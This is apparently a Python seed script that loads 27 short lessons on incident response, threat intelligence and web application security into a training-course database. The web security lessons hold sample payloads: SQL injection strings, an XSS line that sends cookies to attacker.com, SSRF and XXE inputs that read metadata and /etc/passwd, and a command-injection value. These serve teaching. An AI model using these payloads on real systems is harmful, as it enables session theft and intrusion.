"""
Tier 2 seed - simplified reliable approach
Borrows working pattern from Tier 1
"""
import sys
import os
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))

from database.connection import SessionLocal
from models.curriculum import Module, Lesson

def cl(db, mid, o, t, d, m, c):
    """Create lesson - abbreviated to avoid line length"""
    ex = db.query(Lesson).filter(Lesson.module_id == mid, Lesson.order == o).first()
    if not ex:
        l = Lesson(module_id=mid, order=o, title=t, description=d, duration_minutes=m, content_markdown=c, is_published=True)
        db.add(l)
        print(f"  ✅ {o}. {t}")
    else:
        ex.title, ex.description, ex.duration_minutes, ex.content_markdown, ex.is_published = t, d, m, c, True
        print(f"  ✅ {o}. {t}")

db = SessionLocal()

print("🚀 Tier 2: Hands-on Labs")
print("=" * 60)

m8 = db.query(Module).filter(Module.title == "Incident Response Labs").first()
m9 = db.query(Module).filter(Module.title == "Threat Intelligence Analysis").first()
m10 = db.query(Module).filter(Module.title == "Web Application Security").first()

if not all([m8, m9, m10]):
    print("❌ Modules not found!")
    db.close()
    exit(1)

print("\n🚨 Incident Response Labs")
# Module 8 - 9 lessons with concise practical content

cl(db, m8.id, 1, "Incident Response Methodology", "Learn NIST IR lifecycle and build IR plans", 50, """# Incident Response Methodology

## NIST Lifecycle
1. Preparation
2. Detection & Analysis
3. Containment
4. Eradication
5. Recovery
6. Lessons Learned

## Lab: Build IR playbook for ransomware

**Tools:** NIST CSF, SANS Framework
""")

cl(db, m8.id, 2, "Digital Forensics Fundamentals", "Evidence collection and analysis", 55, """# Digital Forensics

## Imaging
```bash
dd if=/dev/sda of=evidence.img
md5sum evidence.img
```

## Analysis
- Memory dumps (Volatility)
- Timeline analysis
- Chain of custody

**Tools:** Autopsy, FTK, Volatility
""")

cl(db, m8.id, 3, "Malware Analysis Basics", "Static and dynamic malware analysis", 60, """# Malware Analysis

## Static Analysis
```bash
strings malware.exe
peframe malware.exe
```

## Dynamic Analysis
- Sandbox execution
- Network behavior
- API monitoring

**Tools:** IDA, Ghidra, Cuckoo
""")

cl(db, m8.id, 4, "Log Analysis & SIEM", "SIEM correlation and threat detection", 50, """# Log Analysis

## Splunk Queries
```
index=security EventCode=4625 | stats count by src_ip
```

## Detection Rules
- Failed logins
- Lateral movement
- Data exfiltration

**Tools:** Splunk, ELK, Graylog
""")

cl(db, m8.id, 5, "Network Traffic Analysis", "Wireshark and packet analysis", 55, """# Network Analysis

## Wireshark
```
http.request.method == "POST"
tcp.flags.syn == 1
```

## Detect
- Port scans
- C2 traffic
- DNS tunneling

**Tools:** Wireshark, Zeek
""")

cl(db, m8.id, 6, "Ransomware Response", "Handle ransomware incidents", 60, """# Ransomware Response

## Steps
1. Isolate systems
2. Identify variant
3. Preserve evidence
4. Restore from backups
5. Patch vulnerabilities

## Prevention
- Backups (3-2-1 rule)
- Email filtering
- Network segmentation

**Resources:** NoMoreRansom
""")

cl(db, m8.id, 7, "APT Investigation", "Investigate Advanced Persistent Threats", 65, """# APT Investigation

## MITRE ATT&CK
```
Initial Access → Execution → Persistence → Lateral Movement
```

## Investigation
- IOC collection
- Timeline analysis
- TTP mapping

**Tools:** Velociraptor, OSQuery
""")

cl(db, m8.id, 8, "Cloud Incident Response", "AWS, Azure, GCP incident response", 55, """# Cloud IR

## AWS
```bash
aws cloudtrail lookup-events
aws s3api get-bucket-acl
```

## Azure
```powershell
Get-AzureADAuditSignInLogs
```

**Tools:** GuardDuty, Sentinel
""")

cl(db, m8.id, 9, "Incident Reporting", "Create incident reports and post-mortems", 45, """# Incident Reporting

## Report Structure
- Executive Summary
- Timeline
- Technical Details
- Response Actions
- Lessons Learned
- Recommendations

## Metrics
- MTTD, MTTR, MTTC

**Templates:** SANS forms
""")

print("\n🔍 Threat Intelligence Analysis")
# Module 9 - 8 lessons

cl(db, m9.id, 1, "Threat Intelligence Fundamentals", "Types, sources, and intelligence cycle", 45, """# Threat Intel Fundamentals

## Types
- Strategic (executives)
- Tactical (architects)
- Operational (SOC)
- Technical (IOCs)

## Cycle
Planning → Collection → Processing → Analysis → Dissemination

**Standards:** STIX, TAXII, MISP
""")

cl(db, m9.id, 2, "OSINT for Security", "Gather public intelligence", 50, """# OSINT

## Tools
```bash
whois example.com
theHarvester -d example.com
shodan search "org:Target"
```

## Sources
- Public records
- Social media
- Dark web
- Paste sites

**Tools:** Maltego, SpiderFoot
""")

cl(db, m9.id, 3, "IOC Management", "Collect and operationalize IOCs", 45, """# IOC Management

## Types
- Network (IPs, domains)
- Host (hashes, registry)
- Email (addresses, subjects)

## Integration
- SIEM enrichment
- Firewall blocking
- EDR detection

**Tools:** MISP, OpenCTI
""")

cl(db, m9.id, 4, "Threat Actor Profiling", "Profile threat actors and TTPs", 50, """# Threat Actor Profiling

## Attribution
- Malware signatures
- Infrastructure patterns
- Language artifacts
- TTPs

## Famous Groups
- APT28, APT29 (Russia)
- Lazarus (North Korea)
- APT41 (China)

**Resources:** MITRE ATT&CK Groups
""")

cl(db, m9.id, 5, "Malware Intelligence", "Track malware campaigns", 55, """# Malware Intelligence

## Campaign Tracking
- Variants
- C2 infrastructure
- Delivery methods
- Victims

## YARA Rules
```yara
rule Ransomware {
    strings:
        $a = "decrypt"
        $b = "bitcoin"
    condition:
        all of them
}
```

**Tools:** VirusTotal, ANY.RUN
""")

cl(db, m9.id, 6, "Threat Hunting", "Proactive threat hunting", 60, """# Threat Hunting

## Methodology
Hypothesis → Data Collection → Analysis → Response

## Queries
```
process_name:powershell.exe AND command_line:*-enc*
```

## Techniques
- Stack counting
- MITRE ATT&CK mapping
- Anomaly detection

**Tools:** Velociraptor, KQL
""")

cl(db, m9.id, 7, "Threat Intelligence Platforms", "Deploy TIPs", 50, """# Threat Intelligence Platforms

## MISP
```python
from pymisp import PyMISP
misp = PyMISP(url, api_key)
event = misp.new_event(info="Campaign")
```

## Sharing
- ISAC communities
- TLP protocol
- Automated feeds

**Platforms:** MISP, OpenCTI, TheHive
""")

cl(db, m9.id, 8, "Intelligence-Driven Defense", "Apply intelligence to defenses", 45, """# Intelligence-Driven Defense

## Integration
- SIEM enrichment
- Firewall automation
- Detection engineering

## Metrics
- Timeliness
- Relevance
- Accuracy
- Actionability

**Frameworks:** Kill Chain, Diamond Model
""")

print("\n🌐 Web Application Security")
# Module 10 - 10 lessons

cl(db, m10.id, 1, "OWASP Top 10", "Master OWASP vulnerabilities", 50, """# OWASP Top 10

## 2021 List
1. Broken Access Control
2. Cryptographic Failures
3. Injection
4. Insecure Design
5. Security Misconfiguration
6. Vulnerable Components
7. Auth Failures
8. Data Integrity Failures
9. Logging Failures
10. SSRF

**Lab:** Test each on DVWA
""")

cl(db, m10.id, 2, "SQL Injection", "Exploit and defend against SQLi", 55, """# SQL Injection

## Detection
```
' OR '1'='1
' UNION SELECT NULL--
```

## Exploitation
```bash
sqlmap -u "http://target/?id=1" --dbs
```

## Defense
```python
cursor.execute("SELECT * FROM users WHERE id = ?", (id,))
```

**Tools:** SQLMap, Burp Suite
""")

cl(db, m10.id, 3, "Cross-Site Scripting", "Find and exploit XSS", 50, """# XSS

## Types
- Reflected
- Stored  
- DOM-based

## Exploitation
```javascript
<script>fetch('http://attacker.com?c='+document.cookie)</script>
```

## Defense
```python
from html import escape
output = escape(user_input)
```

**Tools:** XSS Hunter, BEEF
""")

cl(db, m10.id, 4, "Authentication & Sessions", "Test auth and session security", 55, """# Authentication

## Attacks
- Brute force
- Session hijacking
- Session fixation

## MFA
```python
import pyotp
totp = pyotp.TOTP(secret)
verified = totp.verify(code)
```

## Defense
- Strong passwords
- Account lockout
- Secure cookies

**Tools:** Hydra, Burp Suite
""")

cl(db, m10.id, 5, "API Security", "Test REST and GraphQL APIs", 50, """# API Security

## Testing
```bash
# Enumerate
curl -X OPTIONS http://api/v1/
# IDOR
GET /api/user/123
GET /api/user/124
```

## GraphQL
```graphql
query {
  __schema { types { name } }
}
```

**Tools:** Postman, Arjun
""")

cl(db, m10.id, 6, "Server-Side Vulnerabilities", "SSRF, XXE, command injection", 55, """# Server-Side Attacks

## SSRF
```
?url=http://127.0.0.1:9200
?url=http://169.254.169.254/
```

## XXE
```xml
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
```

## Command Injection
```
?cmd=test.txt; whoami
```

**Tools:** Burp Collaborator
""")

cl(db, m10.id, 7, "Business Logic Flaws", "Exploit application logic", 50, """# Business Logic

## Common Flaws
- Price manipulation
- Race conditions
- Workflow bypass
- Coupon stacking

## Testing
- Understand workflow
- Test boundary conditions
- Try negative values
- Concurrent requests

**Resources:** OWASP Guide
""")

cl(db, m10.id, 8, "Client-Side Security", "Test client-side controls", 45, """# Client-Side Security

## Bypass
```javascript
// Disable validation
document.querySelector('button[disabled]').disabled = false
// Modify limits
input.max = 99999
```

## Analysis
- Find hidden endpoints
- Extract secrets
- Manipulate storage

**Tools:** Browser DevTools
""")

cl(db, m10.id, 9, "Secure Development", "SDLC security practices", 50, """# Secure Development

## Practices
- Input validation
- Output encoding
- Parameterized queries
- Security headers

## CI/CD
```yaml
security-scan:
  script:
    - bandit -r .
    - safety check
```

**Tools:** SonarQube, Bandit
""")

cl(db, m10.id, 10, "Web Pentesting", "Full pentest methodology", 60, """# Web Pentesting

## Methodology
1. Reconnaissance
2. Mapping
3. Vulnerability Assessment
4. Exploitation
5. Reporting
6. Retest

## Tools
- Burp Suite Pro
- OWASP ZAP  
- Nikto
- Nuclei

## Report Structure
- Executive Summary
- Technical Findings
- Remediation

**Lab:** Full test on vulnerable app
""")

db.commit()
db.close()

print("\n" + "=" * 60)
print("✅ TIER 2 COMPLETE!")
print("   🚨 Incident Response: 9 lessons")
print("   🔍 Threat Intelligence: 8 lessons")
print("   🌐 Web App Security: 10 lessons")
print("   🎯 Total: 27 lessons")
print("\n🎉 ALL 88 LESSONS COMPLETE!")
